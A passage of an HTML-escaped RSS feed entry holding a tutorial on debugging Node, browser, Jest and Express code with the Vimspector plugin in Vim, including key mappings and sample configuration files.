&lt;pre class="highlight plaintext"&gt;&lt;code&gt;nmap &amp;lt;Leader&amp;gt;dh &amp;lt;Plug&amp;gt;VimspectorStepOut
nmap &amp;lt;Leader&amp;gt;dl &amp;lt;Plug&amp;gt;VimspectorStepInto
nmap &amp;lt;Leader&amp;gt;dj &amp;lt;Plug&amp;gt;VimspectorStepOver
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you are not sure what stepping out, stepping into, and stepping over are, I found these short video tutorials very helpful:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=KEdq7gC_RTA&amp;amp;t=347s"&gt;https://www.youtube.com/watch?v=KEdq7gC_RTA&amp;amp;t=347s&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=ypxabWbxSBY"&gt;https://www.youtube.com/watch?v=ypxabWbxSBY&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Back to our debugging - now that we are on the first line of the code, press &lt;code&gt;&amp;lt;Leader&amp;gt;dj&lt;/code&gt; (&lt;code&gt;&amp;lt;Plug&amp;gt;VimspectorStepOver&lt;/code&gt;). Note the highlight moves to the variable declaration. If you press &lt;code&gt;&amp;lt;Leader&amp;gt;dj&lt;/code&gt; one more time, it will move down again. If you keep stepping over, eventually you will reach the end of &lt;code&gt;simple.js&lt;/code&gt; file. Unfortunately, you can't step "back" to the previous line. Once you're on the next step, you continue forward until you reach the end.&lt;/p&gt;

&lt;p&gt;If you accidentally step over an important line, just restart the debugger. To restart, run &lt;code&gt;&amp;lt;Leader&amp;gt;dk&lt;/code&gt; (&lt;code&gt;&amp;lt;Plug&amp;gt;VimspectorRestart&lt;/code&gt;). When you restart, Vimspector starts over from the beginning. Alternatively, you could also Reset and Launch Vimspector again.&lt;/p&gt;

&lt;p&gt;You can put breakpoints throughout the file. Back in the main &lt;code&gt;simple.js&lt;/code&gt; file, run &lt;code&gt;&amp;lt;Leader&amp;gt;dt&lt;/code&gt; (&lt;code&gt;:call vimspector#ToggleBreakpoint()&lt;/code&gt;) on the line where you want to add a breakpoint (run that command again on the line with the breakpoint to remove it).&lt;/p&gt;

&lt;p&gt;Once you sprinkle breakpoints all over your file, launch Vimspector again. If you press &lt;code&gt;&amp;lt;Leader&amp;gt;dc&lt;/code&gt; (&lt;code&gt;:call vimspector#Continue()&lt;/code&gt;), Vimspector will jump to the next breakpoint. Pretty cool!&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_AiUj1G4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7alill7meanmvus075d2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_AiUj1G4--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7alill7meanmvus075d2.png" alt="Vimspector continue"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To clear the breakpoints, run &lt;code&gt;&amp;lt;Leader&amp;gt;dT&lt;/code&gt; (&lt;code&gt;:call vimspector#ClearBreakpoints()&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Before moving on to the next section, spend 10-15 minutes experimenting with &lt;code&gt;simple.js&lt;/code&gt;. Change the codes in &lt;code&gt;simple.js&lt;/code&gt;. Move around. Play.&lt;/p&gt;

&lt;p&gt;Before we move on to the next section, let's briefly go over what  the 6 Vimspector windows do.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#variables-window"&gt;
  &lt;/a&gt;
  Variables window
&lt;/h4&gt;

&lt;p&gt;The Variables window contains the available variables (and their current values) relative to their current scope.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;- Scope: Local
  + this (Object): Object
  - __dirname (string): "/Users/iggy/.vim/plugged/vimspector/support/test/node/simple"
  - __filename (string): "/Users/iggy/.vim/plugged/vimspector/support/test/node/simple/simple.js"
  + exports (Object): Object {}
  + module (Object): Module {id: ".", path: "/Users/iggy/.vim/plugged/vimspector/support/test/n…", exports: Object, …}
 *- msg (undefined): undefined
 *- obj (undefined): undefined
  + require (Function): function require(path) { … }
+ Scope: Global
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the above example, inside the Local scope, I have common Node variables like &lt;code&gt;this&lt;/code&gt;, &lt;code&gt;__dirname&lt;/code&gt;, &lt;code&gt;__filename&lt;/code&gt; and the written variables &lt;code&gt;msg&lt;/code&gt; and &lt;code&gt;obj&lt;/code&gt;. Pay attention as you step over to the next variable. Watch them go from undefined to having a value.&lt;/p&gt;

&lt;p&gt;Do this: step over and into different function scopes. Find a way to get inside a function and see what the available variables are. Then step outside and compare them. Also check what is inside &lt;code&gt;Scope: Global&lt;/code&gt;. Why does it have the variables it has? What does it tell you about Node?&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#watch-window"&gt;
  &lt;/a&gt;
  Watch Window
&lt;/h4&gt;

&lt;p&gt;The Watch window is where you can watch for specific values. Initially it will be blank. If you want to watch the value of the &lt;code&gt;msg&lt;/code&gt; variable, type into the Watch window that variable, &lt;code&gt;msg&lt;/code&gt;. When you're at the start of the file, the value will be &lt;code&gt;undefined&lt;/code&gt;. Then as you steps over, the value will change into &lt;code&gt;'Hello, world!'&lt;/code&gt;. &lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#stack-trace-window"&gt;
  &lt;/a&gt;
  Stack Trace window
&lt;/h4&gt;

&lt;p&gt;The Stack Trace window displays the call stack of the node file execution.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#console-window"&gt;
  &lt;/a&gt;
  Console window
&lt;/h4&gt;

&lt;p&gt;In the Console window, you can enter the defined variables like &lt;code&gt;msg&lt;/code&gt;. You can also evaluate expressions.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#terminal-window"&gt;
  &lt;/a&gt;
  Terminal window
&lt;/h4&gt;

&lt;p&gt;The Terminal window displays all the outputs throughout the entire debugging session.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#debugging-in-a-browser"&gt;
  &lt;/a&gt;
  Debugging in a Browser
&lt;/h3&gt;

&lt;p&gt;Let's explore how to use the Chrome-debugger to debug a client-side app. Lucky for us, there is also an example in the Vimspector directory. Inside &lt;code&gt;~/.vim/plugged/vimspector/support/test/chrome/&lt;/code&gt; directory, you will find a file named &lt;code&gt;run_server&lt;/code&gt;, a &lt;code&gt;test.js&lt;/code&gt;, and a &lt;code&gt;.vimspector.json&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let's check out what is inside the vimspector config file:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
  "configurations": {
    "launch": {
      "adapter": "chrome",
      "configuration": {
        "request": "launch",
        "url": "http://localhost:1234/",
        "webRoot": "${workspaceRoot}/www"
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This configuration sure looks different from the Node Vimspector config one we saw earlier. One important line is &lt;code&gt;"adapter": "chrome"&lt;/code&gt; - it indicates that we will be using a Chrome adapter. The URL is defined to be on &lt;code&gt;localhost:1234&lt;/code&gt; because that's the port where our server will be running on.&lt;/p&gt;

&lt;p&gt;Btw, when you launch Vimspector later, it will prompt if you want to break on uncaught exceptions etc again. If you don't want to deal with those prompts, add these lines inside the &lt;code&gt;.vimspector.json&lt;/code&gt; just like you added it to your Node app earlier.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;"breakpoints": {
  "exception": {
    "all": "N",
    "uncaught": "N"
  }
},
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We need to install the correct gadget. In the earlier section, we installed one with &lt;code&gt;:VimspectorInstall vscode-node-debug2&lt;/code&gt;. This time we have to install one for chrome. Run this from Vim:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;:VimspectorInstall debugger-for-chrome
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once done, run the server (make sure you have PHP installed):&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;./run_server
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Check out &lt;code&gt;localhost:1234&lt;/code&gt;. You should see a simple app with some pop-out modals.&lt;/p&gt;

&lt;p&gt;Now open &lt;code&gt;www/js/test.js&lt;/code&gt;. Add breakpoints anywhere you like. Run the Vimspector launch command &lt;code&gt;&amp;lt;Leader&amp;gt;dd&lt;/code&gt;. By running it, it will automatically launch the Chrome browser. Vimspector will pause the Chrome browser where your breakpoints are. Step over and step into your breakpoints. Watch some variables. Change the code. Play around!&lt;/p&gt;

&lt;p&gt;Note: check out the Variables window. Check out both the Local and Global scope. Did you see anything different in the Global scope compared to when you're debugging with Node? What does this tell you about client-side vs backend code execution?&lt;/p&gt;

&lt;p&gt;Note 2: notice how this time, when you launch Vimspector, it launches a Chrome browser. If you look at the &lt;code&gt;.vimspector.json&lt;/code&gt;, you'll see a &lt;code&gt;"request": "launch",&lt;/code&gt; instead of &lt;code&gt;"request": "attach",&lt;/code&gt; from earlier Node debugging. How are they different? There are two ways you can debug an app: by attaching it to an already running process or by launching a new process.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#debugging-a-jest-test"&gt;
  &lt;/a&gt;
  Debugging a Jest test
&lt;/h2&gt;

&lt;p&gt;Now let's learn how to debug a Jest test. For this section, I will be using the &lt;a href="https://github.com/microsoft/vscode-recipes/"&gt;vscode-recipes&lt;/a&gt; repository. First go to the site and clone the repository. Then go to the &lt;code&gt;debugging-jest-tests/&lt;/code&gt; directory. You will find two directories: &lt;code&gt;lib/&lt;/code&gt; and a &lt;code&gt;test/&lt;/code&gt;. This is our workspace root directory. &lt;/p&gt;

&lt;p&gt;First, install the dependencies: &lt;code&gt;npm i&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Make sure that the Jest test is running and they are all passing: &lt;code&gt;npm run test&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Debugging a Jest test requires a node debugger. If you've been typing along, you should already have the Node debugger from earlier. With Vimspector, you install your gadget only once (Vimspector saves all the installed gadgets inside the Vimspector directory - in my case, they are stored inside &lt;code&gt;~/.vim/plugged/vimspector/&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Inside the &lt;code&gt;debugging-jest-tests/&lt;/code&gt; directory, add a &lt;code&gt;.vimspector.json&lt;/code&gt; file. Inside it:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;  "configurations": {
    "my awesome jest test": {
      "adapter": "vscode-node",
      "breakpoints": {
        "exception": {
          "all": "N",
          "uncaught": "N"
        }
      },
      "configuration": {
        "request": "launch",
        "name": "Jest debugger",
        "type": "node",
        "console": "integratedTerminal",
        "program": "${workspaceRoot}/node_modules/.bin/jest",
        "skipFiles": ["*/&amp;lt;node_internals&amp;gt;/**/*.js", "node_modules/**/*.js"],
        "cwd": "${workspaceRoot}"
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The configuration looks familiar, with a new addition of: &lt;code&gt;"program"&lt;/code&gt;: "&lt;code&gt;${workspaceRoot}/node_modules/.bin/jest"&lt;/code&gt;. Here's the breakdown:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;workspaceRoot&lt;/code&gt; is the current directory (the &lt;code&gt;debugging-jest-tests/&lt;/code&gt; directory). &lt;/li&gt;
&lt;li&gt;The &lt;code&gt;node_modules/.bin/jest&lt;/code&gt; is the Jest executable from the &lt;code&gt;node_modules/&lt;/code&gt; (which you should have after &lt;code&gt;npm i&lt;/code&gt;). &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This time when you run the debugger, Vimspector needs to run the Jest executable. One place where you can find a Jest executable is inside the &lt;code&gt;node_modules/&lt;/code&gt; directory. You could've also run it from the global Jest command, but I like to keep it compartmentalized (what if I am running this from a container and I'm not guaranteed to have a global Jest command? By using the &lt;code&gt;.bin/jest&lt;/code&gt; command, I'm guaranteed to have it - but that's just my personal preference).&lt;/p&gt;

&lt;p&gt;Cool! Let's put some breakpoints inside the test files, then launch the Vimspector (&lt;code&gt;&amp;lt;Leader&amp;gt;dd&lt;/code&gt;). Voila! Your test suite will pause and you can now debug your code.&lt;/p&gt;

&lt;p&gt;If you put your breakpoint on the line where it calls the function, like the function &lt;code&gt;add()&lt;/code&gt; below:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;...
it('Should return correct result', () =&amp;gt; {
  const result = add(1, 2); // put a breakpoint here
  expect(result).toEqual(3);
});
...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;When you step into it (&lt;code&gt;&amp;lt;Leader&amp;gt;dl&lt;/code&gt;), it will go into the original function declaration inside &lt;code&gt;lib/calc.js&lt;/code&gt;, allowing you to investigate the source code. How awesome is that!? With this, you can debug a faulty test down to where the function originated!&lt;/p&gt;

&lt;p&gt;There is one problem. With the current Vimspector config, it will run &lt;em&gt;all&lt;/em&gt; the tests when you launch it. That's great but in real life, your app probably has hundreds of tests (if you've been practicing TDD... &lt;strong&gt;wink wink&lt;/strong&gt;). Running &lt;em&gt;all&lt;/em&gt; tests are probably not the best way to live your life. What if you want to run one particular test at a time?&lt;/p&gt;

&lt;p&gt;You sure can!&lt;/p&gt;

&lt;p&gt;In Jest, you can run a specific file by passing that file name (or part of the name) as an argument. If you want to run only the &lt;code&gt;add.spec.js&lt;/code&gt;, you can run the command &lt;code&gt;jest add&lt;/code&gt;. Jest is smart enough to match the &lt;code&gt;add.spec.js&lt;/code&gt; and not the &lt;code&gt;subtract.spec.js&lt;/code&gt;. &lt;/p&gt;

&lt;p&gt;If you want to match a particular test in a file, Jest is also smart enough to match any keyword you pass using the &lt;code&gt;-t&lt;/code&gt; option.&lt;/p&gt;

&lt;p&gt;Suppose that inside the &lt;code&gt;add.spec.js&lt;/code&gt; I have two tests (notice that I modified the test descriptions):&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const { add } = require('../lib/calc');

describe('When adding numbers', () =&amp;gt; {
  it('one should return correct result', () =&amp;gt; {
    const result = add(1, 2);
    expect(result).toEqual(3);
  });

  it('two should not return correct result', () =&amp;gt; {
    const result = add(1, 5);
    expect(result).not.toEqual(3);
  });
});
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;I want to run only the second test. To do that, from the CLI I can run &lt;code&gt;test add -t two&lt;/code&gt;. Jest is smart enough to run only &lt;code&gt;add.spec.js&lt;/code&gt; &lt;strong&gt;and&lt;/strong&gt; only the &lt;code&gt;'two should not return correct result'&lt;/code&gt; test! Try it.&lt;/p&gt;

&lt;p&gt;Armed with that knowledge, we need to pass these arguments when running Vimspector. Turns out that Vimspector has the &lt;code&gt;args&lt;/code&gt; attribute where you can pass argument(s) to your program.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
  "configurations": {
    "jest": {
      "adapter": "vscode-node",
      "breakpoints": {
        "exception": {
          "all": "N",
          "uncaught": "N"
        }
      },
      "configuration": {
        "request": "launch",
        "name": "Jest debugger",
        "type": "node",
        "console": "integratedTerminal",
        "program": "${workspaceRoot}/node_modules/.bin/jest",
        "skipFiles": ["*/&amp;lt;node_internals&amp;gt;/**/*.js", "node_modules/**/*.js"],
        "cwd": "${workspaceRoot}",
        "args": [
                "${FileName}",
                "-t",
                "${TestName}"
            ]
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Our new attribute, &lt;code&gt;args&lt;/code&gt;, is an array with 3 elements. The funny looking variables (&lt;code&gt;${FileName}&lt;/code&gt; and &lt;code&gt;${TestName}&lt;/code&gt;) are the Vimspector's named arguments. With this I can pass the &lt;code&gt;FileName&lt;/code&gt; and &lt;code&gt;TestName&lt;/code&gt; variables when launching Vimspector.&lt;/p&gt;

&lt;p&gt;Let's launch Vimspector again. This time it will prompt: "Enter value for FileName" (in which you'll enter "add"). After that, the Vimspector will prompt: "Enter value for TestName" (in which you'll enter "two"). And watch it runs only that particular test from that particular file. Success!! &lt;/p&gt;

&lt;p&gt;Now you have &lt;strong&gt;no&lt;/strong&gt; excuse not to practice TDD! :D&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#debugging-an-express-app"&gt;
  &lt;/a&gt;
  Debugging an Express App
&lt;/h2&gt;

&lt;p&gt;For the next example, let's try to debug a simple Express app. Since express is a node library, a node gadget is required.&lt;/p&gt;

&lt;p&gt;Create a directory (&lt;code&gt;mkdir express-debug&lt;/code&gt;) and go in there. Run &lt;code&gt;npm init -y&lt;/code&gt; to initialize an NPM project. Install express (&lt;code&gt;npm i express&lt;/code&gt;). Then create an &lt;code&gt;app.js&lt;/code&gt;. Inside it:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;const express = require('express');
const app = express();
const port = 3000;

const helloFunc = () =&amp;gt; {
  const hello = 'hello';
  return hello;
};

app.get('/', (req, res) =&amp;gt; {
  const msg = helloFunc();
  res.send(msg);
});

app.listen(port, () =&amp;gt; {
  console.log(`Example app listening on port ${port}!`)
});

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Create a &lt;code&gt;.vimspector.json&lt;/code&gt; in that directory. At minimum you should have:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
  "configurations": {
    "run": {
      "adapter": "vscode-node",
      "default": true,
      "configuration": {
        "type": "node",
        "request": "attach",
        "processId": "${processId}"
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;However, it's probably better if we enable some default configs:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
  "configurations": {
    "run": {
      "adapter": "vscode-node",
      "default": true,
      "breakpoints": {
        "exception": {
          "all": "N",
          "uncaught": "N"
        }
      },
      "configuration": {
        "name": "Attaching to a process ID",
        "type": "node",
        "request": "attach",
        "skipFiles": ["node_modules/**/*.js", "&amp;lt;node_internals&amp;gt;/**/*.js"],
        "processId": "${processId}"
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Then run the express app in inspect mode:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;node --inspect app.js
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;You should see your app running on &lt;code&gt;localhost:3000&lt;/code&gt;. Next, add a few breakpoints inside &lt;code&gt;app.js&lt;/code&gt;, then launch Vimspector (it will also ask for &lt;code&gt;processId&lt;/code&gt;, but I find that not giving it any value and simply pressing the Return/Enter key works).&lt;/p&gt;

&lt;p&gt;Finally, refresh the page and you should see the debugger pauses at your first breakpoint. From there, you can step out, step into, and step over your code. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qxMywhSN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vf78ki6u7pmopbgq8g4g.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qxMywhSN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vf78ki6u7pmopbgq8g4g.png" alt="Vimspector express"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Congratulations! You've successfully debugged an express app.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#whats-next"&gt;
  &lt;/a&gt;
  What's next?
&lt;/h1&gt;

&lt;p&gt;This article barely scratched the surface of what a debugger can do. There are many more things that you can do with Vimspector. Hopefully by approaching it from different angles, you'll gain a more thorough understanding of this plugin. &lt;/p&gt;

&lt;p&gt;Your debugging needs probably differ from the examples I gave in this article, but I am a sincere believer that if you understand the principles behind it, you should be able to implement Vimspector to meet your needs.&lt;/p&gt;

&lt;p&gt;With that, thanks for reading this far. Happy Vimming!&lt;/p&gt;

</description>
      <category>vim</category>
      <category>vimspector</category>
      <category>debug</category>
      <category>debugging</category>
    </item>
  </channel>
</rss>
